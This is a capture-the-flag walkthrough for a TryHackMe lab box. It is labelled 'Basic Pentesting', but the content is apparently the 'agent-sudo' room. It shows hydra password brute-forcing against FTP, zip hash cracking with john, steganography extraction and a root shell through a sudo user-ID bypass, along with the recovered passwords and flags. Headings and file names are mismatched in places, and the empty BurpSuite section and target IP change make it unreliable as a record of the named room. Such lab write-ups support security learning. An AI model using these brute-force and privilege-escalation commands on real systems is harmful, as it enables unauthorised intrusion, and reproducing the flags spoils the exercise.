<p align="center">
  THM : Basic Pentesting<br>
  Difficulty : Easy<br>
  Room link : https://tryhackme.com/room/basicpentestingjt<br>
</p>

## Summary

- [Nmap scan](#nmap-scan)
- [Bursuite](#burpsuite)
- [SSH Brute-force](#ssh-brute-force)
- [Hash Craking](#hash-cracking)
- [Steganography](#steganography)
- [Capture The Flag](#capture-the-flag)
- [Privilege Escalation](#privilege-escalation)

## Nmap scan

```
┌──(root㉿kali)-[~]
└─# nmap -sC -sV 10.10.143.4
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-27 17:06 CET
Nmap scan report for 10.10.143.4
Host is up (0.048s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef1f5d04d47795066072ecf058f2cc07 (RSA)
|   256 5e02d19ac4e7430662c19e25848ae7ea (ECDSA)
|_  256 2d005cb9fda8c8d880e3924f8b4f18e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Annoucement
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.65 seconds
```

## BurpSuite 


## SSH brute-force

```
┌──(root㉿kali)-[~]
└─# hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.143.4
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-02-27 17:34:42
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.143.4:21/
[21][ftp] host: 10.10.143.4   login: chris   password: crystal
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-02-27 17:35:42

```
                                                                                  

```
┌──(root㉿kali)-[~]
└─# ftp chris@10.10.143.4
Connected to 10.10.143.4.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -al
229 Entering Extended Passive Mode (|||8162|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Oct 29  2019 .
drwxr-xr-x    2 0        0            4096 Oct 29  2019 ..
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.
ftp> get To_agentJ.txt
local: To_agentJ.txt remote: To_agentJ.txt
229 Entering Extended Passive Mode (|||58830|)
150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes).
100% |**********************************************************************************************************************************************************************************************|   217        2.43 MiB/s    00:00 ETA
226 Transfer complete.
217 bytes received in 00:00 (4.08 KiB/s)
ftp> get cute-alien.jpg
local: cute-alien.jpg remote: cute-alien.jpg
229 Entering Extended Passive Mode (|||9202|)
150 Opening BINARY mode data connection for cute-alien.jpg (33143 bytes).
100% |**********************************************************************************************************************************************************************************************| 33143      312.09 KiB/s    00:00 ETA
226 Transfer complete.
33143 bytes received in 00:00 (211.65 KiB/s)
ftp> get cutie.png
local: cutie.png remote: cutie.png
229 Entering Extended Passive Mode (|||6514|)
150 Opening BINARY mode data connection for cutie.png (34842 bytes).
100% |**********************************************************************************************************************************************************************************************| 34842      277.00 KiB/s    00:00 ETA
226 Transfer complete.
34842 bytes received in 00:00 (191.25 KiB/s)
ftp> exit
221 Goodbye.
```
                                                                            
                     
## Hash Cracking
```
┌──(nath㉿kali)-[~/Desktop]
└─$ binwalk -e cutie.png 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression

WARNING: Extractor.execute failed to run external extractor 'jar xvf '%e'': [Errno 2] No such file or directory: 'jar', 'jar xvf '%e'' might not be installed correctly
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22

```

## Steganography

```
┌──(root㉿kali)-[/home/nath/Desktop/_cutie.png.extracted]
└─# zip2john 8702.zip > zip_hash.txt                             
                                                                                                                    
┌──(root㉿kali)-[/home/nath/Desktop/_cutie.png.extracted]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Cost 1 (HMAC size) is 78 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alien            (8702.zip/To_agentR.txt)     
1g 0:00:00:01 DONE (2023-02-27 17:56) 0.7042g/s 17307p/s 17307c/s 17307C/s michael!..280789
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```




```
┌──(root㉿kali)-[/home/nath/Desktop]
└─# steghide --extract -sf cute-alien.png
Enter passphrase: 
wrote extracted data to "message.txt".
                                                                                                                                                                                                                               
┌──(root㉿kali)-[/home/nath/Desktop]
└─# ls
cute-alien.png  cutie.png  _cutie.png.extracted  hash-crack  Leaks  message.txt  reverse-shell  To_agentJ.txt  VPN  Write

┌──(root㉿kali)-[/home/nath/Desktop]
└─# cat message.txt      
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris.
                                                                                                                  
```

## Capture The Flag


```
┌──(root㉿kali)-[/home/nath/Desktop]
└─# ssh james@10.10.143.4
james@10.10.143.4's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Feb 27 17:25:22 UTC 2023

  System load:  0.05              Processes:           98
  Usage of /:   39.8% of 9.78GB   Users logged in:     0
  Memory usage: 20%               IP address for eth0: 10.10.143.4
  Swap usage:   0%


75 packages can be updated.
33 updates are security updates.


Last login: Mon Feb 27 17:24:56 2023 from 10.11.23.108
james@agent-sudo:~$ 

```



```
james@agent-sudo:~$ ls -al
total 80
drwxr-xr-x 4 james james  4096 Oct 29  2019 .
drwxr-xr-x 3 root  root   4096 Oct 29  2019 ..
-rw-r--r-- 1 james james 42189 Jun 19  2019 Alien_autospy.jpg
-rw------- 1 root  root    566 Oct 29  2019 .bash_history
-rw-r--r-- 1 james james   220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 james james  3771 Apr  4  2018 .bashrc
drwx------ 2 james james  4096 Oct 29  2019 .cache
drwx------ 3 james james  4096 Oct 29  2019 .gnupg
-rw-r--r-- 1 james james   807 Apr  4  2018 .profile
-rw-r--r-- 1 james james     0 Oct 29  2019 .sudo_as_admin_successful
-rw-r--r-- 1 james james    33 Oct 29  2019 user_flag.txt
james@agent-sudo:~$ cat user_flag.txt 
b03d975e8c92a7c04146cfa7a5a313c7
james@agent-sudo:~$ 
```



```
scp james@10.10.1.12:/home/james/Alien_autospy.jpg .
james@10.10.1.12's password: 
Alien_autospy.jpg                                                                                                                                                                                      100%   41KB 128.5KB/s   00:00    
```
                                                                                                                                                                                                                   

## Privilege escalation

```
james@agent-sudo:~$ sudo -l
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash


Google : (ALL, !root) /bin/bash

james@agent-sudo:~$ sudo --version
Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2
james@agent-sudo:~$ sudo -u \#$((0xffffffff)) /bin/bash
root@agent-sudo:~# find / -name root.txt
/root/root.txt
root@agent-sudo:~# cat /root/root.txt 
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

Your flag is 
b53a02f55b57d4439e3341834d70c062

By,
DesKel a.k.a Agent R
root@agent-sudo:~# 
```

                                                               
                                               
